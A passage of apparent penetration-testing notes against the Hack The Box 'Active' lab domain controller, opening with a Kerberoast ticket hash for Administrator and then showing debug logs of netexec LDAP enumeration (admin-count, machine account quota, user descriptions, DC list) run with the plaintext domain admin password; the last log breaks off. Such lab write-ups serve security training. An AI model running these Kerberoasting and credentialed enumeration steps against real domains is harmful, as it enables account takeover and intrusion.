                    $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$6a5ad54e62f020999b7009d53bc8029d$560a36ce0db98009ea62cc5c72f031391db1e9df8cef5504e888705ad4690cf84510e2292d88d51ec9721087fb93a6a5a97c33aadc8            
                    2198ec0ee13114b74f357dbac23a1d9e3bb4dba4829b99151b4b040ed69d3308624d55bb1096362a132388876f0921d9a917262ace646964ce0c4911ca923736ebf80fb600ebb9d554cc724ed8445fa969463679fa5d3178ba554fa6d47260e637ea1dbce83c            
                    0076213674ce155641fc05ad43192708da8fbc503e734b18f5320d037f873c6469c179dbb307538730c335a2034b7df8b17e3c7cf14a9ebd1da3d28d98a7e3613e28cb6c8ef2357ed2f9c5a5c3a7909b0311d5401820609294dd0e293a1014b80b5dc2d7c71a            
                    1ae956f2acede7a5de74eded9e145f8bc0d6b9abd71b0277737a5ce77861e96fe5407c60d11536493e36b13bb16513182c2a66739515d8d9265809676aa5ee8b61bac191a5a32e0c14f20266e7349fcb5e437e14a4fe3343f9b0ab39a289f1fa1109922013ce            
                    f422b91420ee6bcba7cad1eca031ba5a9a484fb15f4ce1e873b277c3bd6f7c1ea63af2925196b074794a6104763c9e432e22c32d8441c502de12b7f545bd74ef7d24ff8079fc8c182308d9ab48863a4c18c4c459e0b94457822b108e4062a5f34b5f0a7b0dc8            
                    4d41c58a3c90bde5a7c3a5b7e3798f31e2e128ab1eee074223efcdc92caef44136855a9d23ba422eb7003ae78ce0a8079baad1b3b6e0f896850363e1df118c2b848f587b4b4070d4d0cbd23c5fe66574facffb1935f4cd5cf8429a09daecc4ceb45e20f87b05            
                    bf11372eebff16b181eabbab4e6d7fdccba80356758734f36be2b1764e8d56d12e2b85aa894c84fa4ac293efec2abd01ea3f4e821903dce7c3707be309c80d616e7175b8ef1a4bf90c0e979f846d55798da7f859fcd087b04c6e1fe41059e37101fe35de27bb            
                    a851bbcc4b078768bcd4ff4a3ae699a07e22fa047c51159058f55b5e84abded2d2d308eb699db47a355cdff6b76f7b2ab36eab0db5d07e4216384c9648ea80ea6957bc06b4419902c1043c067d79b0ef0d4e45f23fc723e68eba06bca6dd07ac1e1b3d105beb            
                    cb2b166d780300314265e663905bfdf28c6b7792b652c7a9b03d2d8faa0603be2d6b53ef842c88add255e00bd7d733ecbcefeb71885b0df116d8ec76382b19ca227e188f406da774efe33f65f18998f8db8260685da8e0d27a12977832966f0c26fdbbae2b5e            
                    f204c5b63813a675a994bf58e4175c686a03ff7de1b9622cb2a30698e3f3ae49daf68cfdca030c8ff04a39c5db1ee94fcffaa94ad0649575e91756f7909f4c41ff93fe6bfd0c23a97519c7cf8cb9df17bb7c495ad9b040b677b3a83c8187e1712c59a7e965cc            
                    bbe2e9b84db61e0eb7b32fc1053d014f07d05a6ee                                                                                                                                                                               
[02:59:02] DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --admin-count
```sh
└─$ netexec ldap 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --admin-count --debug
[08:17:54] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='ldap', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], port=389, domain=None,                          
                    local_auth=False, asreproast=None, kerberoasting=None, base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=True, users=None,                        
                    users_export=None, groups=None, computers=False, dc_list=False, get_sid=False, active_users=None, gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=False, collection='Default')                      
           DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
[08:17:55] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.ldap'>, type: <class 'type'>                                                                                                                                            netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/ldap.db                                                                                                                                                       netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.ldap'>                                                                                                                                                                netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Connecting to ldap://10.129.175.223 with no baseDN                                                                                                                                                           ldap.py:173
           DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7f362ca70d70>                                                                                                                                ldap.py:177
[08:17:56] DEBUG    Target: DC.active.htb; target_domain: active.htb; base_dn: DC=active,DC=htb                                                                                                                                  ldap.py:212
           DEBUG    Created connection object                                                                                                                                                                              connection.py:232
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                          ldap.py:257
           DEBUG    Update Hosts: [{'id': 2, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601'}]                                                                database.py:92
           DEBUG    add_host() - Host IDs Updated: [2]                                                                                                                                                                       database.py:102
           DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
[08:17:56] INFO     LDAP        10.129.175.223  389    DC               Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)                                                                                      ldap.py:276
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Connecting to ldap://DC.active.htb - DC=active,DC=htb - 10.129.175.223 [3]                                                                                                                                   ldap.py:432
[08:17:59] DEBUG    Search Filter=(userAccountControl:1.2.840.113556.1.4.803:=8192)                                                                                                                                              ldap.py:625
           DEBUG    Search                                                                                                                                                                                                       ldap.py:625
                    Filter=(|(objectSid=S-1-5-21-405608879-3187717380-1996298813-512)(objectSid=S-1-5-21-405608879-3187717380-1996298813-544)(objectSid=S-1-5-21-405608879-3187717380-1996298813-519)(objectSid=S-1-5-32-549)(ob            
                    jectSid=S-1-5-32-551))                                                                                                                                                                                                  
           DEBUG    Search Filter=(&(objectCategory=user)(sAMAccountName=administrator)(|(memberOf:1.2.840.113556.1.4.1941:=CN=Server Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Backup         ldap.py:625
                    Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Enterprise Admins,CN=Users,DC=active,DC=htb)))                
[08:18:00] DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                 ldap.py:436
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:155
[08:18:00] INFO     LDAP        10.129.175.223  389    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                       ldap.py:440
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling admin_count()                                                                                                                                                                                  connection.py:263
           DEBUG    Search Filter=(&(adminCount=1)(objectClass=user))                                                                                                                                                            ldap.py:625
           DEBUG    Total of records returned 2                                                                                                                                                                                 ldap.py:1072
[08:18:00] INFO     LDAP        10.129.175.223  389    DC               Administrator                                                                                                                                           ldap.py:1076
[08:18:00] INFO     LDAP        10.129.175.223  389    DC               krbtgt                                                                                                                                                  ldap.py:1076
           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### -M maq
```sh
└─$ netexec ldap 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' -M maq --debug
[08:23:06] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='ldap', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=['maq'], module_options=[], list_modules=False, show_module_options=False, hash=[], port=389, domain=None,                       
                    local_auth=False, asreproast=None, kerberoasting=None, base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=False, users=None,                       
                    users_export=None, groups=None, computers=False, dc_list=False, get_sid=False, active_users=None, gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=False, collection='Default')                      
           DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
[08:23:07] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.ldap'>, type: <class 'type'>                                                                                                                                            netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/ldap.db                                                                                                                                                       netexec.py:150
           DEBUG    Modules to be Loaded for sanity check: ['maq'], <class 'list'>                                                                                                                                            netexec.py:182
           DEBUG    Loading module for sanity check maq at path /usr/lib/python3/dist-packages/nxc/modules/maq.py                                                                                                             netexec.py:189
           DEBUG    Supported protocols: ['ldap']                                                                                                                                                                         moduleloader.py:71
           DEBUG    Protocol: ldap                                                                                                                                                                                        moduleloader.py:72
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.ldap'>                                                                                                                                                                netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Connecting to ldap://10.129.175.223 with no baseDN                                                                                                                                                           ldap.py:173
[08:23:08] DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7fa8c4300590>                                                                                                                                ldap.py:177
           DEBUG    Target: DC.active.htb; target_domain: active.htb; base_dn: DC=active,DC=htb                                                                                                                                  ldap.py:212
           DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[08:23:09] INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                          ldap.py:257
           DEBUG    Update Hosts: [{'id': 2, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601'}]                                                                database.py:92
           DEBUG    add_host() - Host IDs Updated: [2]                                                                                                                                                                       database.py:102
           DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
[08:23:09] INFO     LDAP        10.129.175.223  389    DC               Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)                                                                                      ldap.py:276
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Connecting to ldap://DC.active.htb - DC=active,DC=htb - 10.129.175.223 [3]                                                                                                                                   ldap.py:432
[08:23:13] DEBUG    Search Filter=(userAccountControl:1.2.840.113556.1.4.803:=8192)                                                                                                                                              ldap.py:625
           DEBUG    Search                                                                                                                                                                                                       ldap.py:625
                    Filter=(|(objectSid=S-1-5-21-405608879-3187717380-1996298813-512)(objectSid=S-1-5-21-405608879-3187717380-1996298813-544)(objectSid=S-1-5-21-405608879-3187717380-1996298813-519)(objectSid=S-1-5-32-549)(ob            
                    jectSid=S-1-5-32-551))                                                                                                                                                                                                  
           DEBUG    Search Filter=(&(objectCategory=user)(sAMAccountName=administrator)(|(memberOf:1.2.840.113556.1.4.1941:=CN=Server Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Backup         ldap.py:625
                    Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Enterprise Admins,CN=Users,DC=active,DC=htb)))                
[08:23:14] DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                 ldap.py:436
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:155
[08:23:14] INFO     LDAP        10.129.175.223  389    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                       ldap.py:440
           INFO     Loading modules for target: 10.129.175.223                                                                                                                                                             connection.py:589
           DEBUG    Supported protocols: ['ldap']                                                                                                                                                                         moduleloader.py:71
           DEBUG    Protocol: ldap                                                                                                                                                                                        moduleloader.py:72
           DEBUG    Calling modules                                                                                                                                                                                        connection.py:238
           DEBUG    Loading module maq - <NXCModule.NXCModule object at 0x7fa8c5b12f90>                                                                                                                                    connection.py:273
           DEBUG    Loading context for module maq - <NXCModule.NXCModule object at 0x7fa8c5b12f90>                                                                                                                        connection.py:283
           DEBUG    Module maq has on_login method                                                                                                                                                                         connection.py:293
[08:23:14] INFO     MAQ         10.129.175.223  389    DC               Getting the MachineAccountQuota                                                                                                                            maq.py:26
           DEBUG    Search Filter=(objectClass=*)                                                                                                                                                                                ldap.py:625
[08:23:16] INFO     MAQ         10.129.175.223  389    DC               MachineAccountQuota: 10                                                                                                                                    maq.py:30
[08:23:16] DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### -M get-desc-users
```sh
└─$ netexec ldap 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' -M get-desc-users --debug
[08:30:39] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='ldap', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=['get-desc-users'], module_options=[], list_modules=False, show_module_options=False, hash=[], port=389,                         
                    domain=None, local_auth=False, asreproast=None, kerberoasting=None, base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=False,                      
                    users=None, users_export=None, groups=None, computers=False, dc_list=False, get_sid=False, active_users=None, gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=False,                                
                    collection='Default')                                                                                                                                                                                                   
           DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.ldap'>, type: <class 'type'>                                                                                                                                            netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/ldap.db                                                                                                                                                       netexec.py:150
[08:30:40] DEBUG    Modules to be Loaded for sanity check: ['get-desc-users'], <class 'list'>                                                                                                                                 netexec.py:182
           DEBUG    Loading module for sanity check get-desc-users at path /usr/lib/python3/dist-packages/nxc/modules/get-desc-users.py                                                                                       netexec.py:189
           DEBUG    Supported protocols: ['ldap']                                                                                                                                                                         moduleloader.py:71
           DEBUG    Protocol: ldap                                                                                                                                                                                        moduleloader.py:72
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.ldap'>                                                                                                                                                                netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Connecting to ldap://10.129.175.223 with no baseDN                                                                                                                                                           ldap.py:173
           DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7f862cf64590>                                                                                                                                ldap.py:177
[08:30:41] DEBUG    Target: DC.active.htb; target_domain: active.htb; base_dn: DC=active,DC=htb                                                                                                                                  ldap.py:212
           DEBUG    Created connection object                                                                                                                                                                              connection.py:232
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                          ldap.py:257
           DEBUG    Update Hosts: [{'id': 2, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601'}]                                                                database.py:92
           DEBUG    add_host() - Host IDs Updated: [2]                                                                                                                                                                       database.py:102
           DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
[08:30:41] INFO     LDAP        10.129.175.223  389    DC               Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)                                                                                      ldap.py:276
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Connecting to ldap://DC.active.htb - DC=active,DC=htb - 10.129.175.223 [3]                                                                                                                                   ldap.py:432
[08:30:44] DEBUG    Search Filter=(userAccountControl:1.2.840.113556.1.4.803:=8192)                                                                                                                                              ldap.py:625
           DEBUG    Search                                                                                                                                                                                                       ldap.py:625
                    Filter=(|(objectSid=S-1-5-21-405608879-3187717380-1996298813-512)(objectSid=S-1-5-21-405608879-3187717380-1996298813-544)(objectSid=S-1-5-21-405608879-3187717380-1996298813-519)(objectSid=S-1-5-32-549)(ob            
                    jectSid=S-1-5-32-551))                                                                                                                                                                                                  
           DEBUG    Search Filter=(&(objectCategory=user)(sAMAccountName=administrator)(|(memberOf:1.2.840.113556.1.4.1941:=CN=Server Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Backup         ldap.py:625
                    Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Enterprise Admins,CN=Users,DC=active,DC=htb)))                
[08:30:45] DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                 ldap.py:436
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:155
[08:30:45] INFO     LDAP        10.129.175.223  389    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                       ldap.py:440
           INFO     Loading modules for target: 10.129.175.223                                                                                                                                                             connection.py:589
           DEBUG    Supported protocols: ['ldap']                                                                                                                                                                         moduleloader.py:71
           DEBUG    Protocol: ldap                                                                                                                                                                                        moduleloader.py:72
           DEBUG    Calling modules                                                                                                                                                                                        connection.py:238
           DEBUG    Loading module get-desc-users - <NXCModule.NXCModule object at 0x7f862e74ef90>                                                                                                                         connection.py:273
           DEBUG    Loading context for module get-desc-users - <NXCModule.NXCModule object at 0x7f862e74ef90>                                                                                                             connection.py:283
           DEBUG    Module get-desc-users has on_login method                                                                                                                                                              connection.py:293
           DEBUG    Search Filter=(objectclass=user)                                                                                                                                                                    get-desc-users.py:42
           DEBUG    Total of records returned 8                                                                                                                                                                         get-desc-users.py:58
           DEBUG    No filter option enabled                                                                                                                                                                            get-desc-users.py:71
[08:30:45] INFO     GET-DESC... 10.129.175.223  389    DC               Found following users:                                                                                                                          get-desc-users.py:64
[08:30:45] INFO     GET-DESC... 10.129.175.223  389    DC               User: Administrator description: Built-in account for administering the computer/domain                                                         get-desc-users.py:66
[08:30:45] INFO     GET-DESC... 10.129.175.223  389    DC               User: Guest description: Built-in account for guest access to the computer/domain                                                               get-desc-users.py:66
[08:30:45] INFO     GET-DESC... 10.129.175.223  389    DC               User: krbtgt description: Key Distribution Center Service Account                                                                               get-desc-users.py:66
           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --dc-list
```sh
└─$ netexec ldap 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --dc-list --debug
[09:00:36] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='ldap', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], port=389, domain=None,                          
                    local_auth=False, asreproast=None, kerberoasting=None, base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=False, users=None,                       
                    users_export=None, groups=None, computers=False, dc_list=True, get_sid=False, active_users=None, gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=False, collection='Default')                       
           DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
[09:00:37] DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.ldap'>, type: <class 'type'>                                                                                                                                            netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/ldap.db                                                                                                                                                       netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.ldap'>                                                                                                                                                                netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Connecting to ldap://10.129.175.223 with no baseDN                                                                                                                                                           ldap.py:173
           DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7f1bf2490d70>                                                                                                                                ldap.py:177
[09:00:38] DEBUG    Target: DC.active.htb; target_domain: active.htb; base_dn: DC=active,DC=htb                                                                                                                                  ldap.py:212
           DEBUG    Created connection object                                                                                                                                                                              connection.py:232
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                          ldap.py:257
           DEBUG    Update Hosts: [{'id': 2, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601'}]                                                                database.py:92
           DEBUG    add_host() - Host IDs Updated: [2]                                                                                                                                                                       database.py:102
           DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
[09:00:38] INFO     LDAP        10.129.175.223  389    DC               Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)                                                                                      ldap.py:276
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Connecting to ldap://DC.active.htb - DC=active,DC=htb - 10.129.175.223 [3]                                                                                                                                   ldap.py:432
[09:00:40] DEBUG    Search Filter=(userAccountControl:1.2.840.113556.1.4.803:=8192)                                                                                                                                              ldap.py:625
[09:00:41] DEBUG    Search                                                                                                                                                                                                       ldap.py:625
                    Filter=(|(objectSid=S-1-5-21-405608879-3187717380-1996298813-512)(objectSid=S-1-5-21-405608879-3187717380-1996298813-544)(objectSid=S-1-5-21-405608879-3187717380-1996298813-519)(objectSid=S-1-5-32-549)(ob            
                    jectSid=S-1-5-32-551))                                                                                                                                                                                                  
           DEBUG    Search Filter=(&(objectCategory=user)(sAMAccountName=administrator)(|(memberOf:1.2.840.113556.1.4.1941:=CN=Server Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Backup         ldap.py:625
                    Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Enterprise Admins,CN=Users,DC=active,DC=htb)))                
[09:00:42] DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                 ldap.py:436
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:155
